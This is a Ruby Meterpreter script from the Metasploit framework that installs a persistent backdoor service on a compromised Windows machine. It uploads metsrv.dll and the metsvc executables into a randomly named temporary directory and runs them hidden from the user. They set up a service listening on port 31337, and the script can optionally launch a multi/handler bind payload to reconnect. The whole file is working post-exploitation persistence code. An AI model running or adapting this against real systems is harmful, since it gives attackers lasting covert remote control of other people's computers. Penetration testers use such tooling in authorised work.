#
# Meterpreter script for installing the meterpreter service
#

session = client

#
# Options
#
opts = Rex::Parser::Arguments.new(
	"-h"  => [ false,  "This help menu"],
	"-r"  => [ false,  "Uninstall an existing Meterpreter service (files must be deleted manually)"],
	"-A"  => [ false,  "Automatically start a matching multi/handler to connect to the service"]
)

# Exec a command and return the results
def m_exec(session, cmd)
	r = session.sys.process.execute(cmd, nil, {'Hidden' => true, 'Channelized' => true})
	b = ""
	while(d = r.channel.read)
		b << d
	end
	r.channel.close
	r.close
	b
end

#
# Default parameters
#

based    = File.join(Msf::Config.data_directory, "meterpreter")
rport    = 31337
install  = false
autoconn = false
remove   = false
if client.platform =~ /win32|win64/

	#
	# Option parsing
	#
	opts.parse(args) do |opt, idx, val|
		case opt
		when "-h"
			print_line(opts.usage)
			raise Rex::Script::Completed
		when "-A"
			autoconn = true
		when "-r"
			remove = true
		end
	end

	#
	# Create the persistent VBS
	#

	if(not remove)
		print_status("Creating a meterpreter service on port #{rport}")
	else
		print_status("Removing the existing Meterpreter service")
	end

	#
	# Upload to the filesystem
	#

	tempdir = client.fs.file.expand_path("%TEMP%") + "\\" + Rex::Text.rand_text_alpha(rand(8)+8)

	print_status("Creating a temporary installation directory #{tempdir}...")
	client.fs.dir.mkdir(tempdir)

	%W{ metsrv.dll metsvc-server.exe metsvc.exe }.each do |bin|
		next if (bin != "metsvc.exe" and remove)
		print_status(" >> Uploading #{bin}...")
		fd = client.fs.file.new(tempdir + "\\" + bin, "wb")
		fd.write(::File.read(File.join(based, bin), ::File.size(::File.join(based, bin))))
		fd.close
	end

	#
	# Execute the agent
	#
	if(not remove)
		print_status("Starting the service...")
		client.fs.dir.chdir(tempdir)
		data = m_exec(client, "metsvc.exe install-service")
		print_line("\t#{data}")
	else
		print_status("Stopping the service...")
		client.fs.dir.chdir(tempdir)
		data = m_exec(client, "metsvc.exe remove-service")
		print_line("\t#{data}")
	end

	if(remove)
		m_exec(client, "cmd.exe /c del metsvc.exe")
	end

	#
	# Setup the multi/handler if requested
	#
	if(autoconn)
		print_status("Trying to connect to the Meterpreter service at #{client.session_host}:#{rport}...")
		mul = client.framework.exploits.create("multi/handler")
		mul.datastore['WORKSPACE'] = client.workspace
		mul.datastore['PAYLOAD'] = "windows/metsvc_bind_tcp"
		mul.datastore['LPORT']   = rport
		mul.datastore['RHOST']   = client.session_host
		mul.datastore['ExitOnSession'] = false
		mul.exploit_simple(
			'Payload'        => mul.datastore['PAYLOAD'],
			'RunAsJob'       => true
		)
	end

else
	print_error("This version of Meterpreter is not supported with this Script!")
	raise Rex::Script::Completed
end
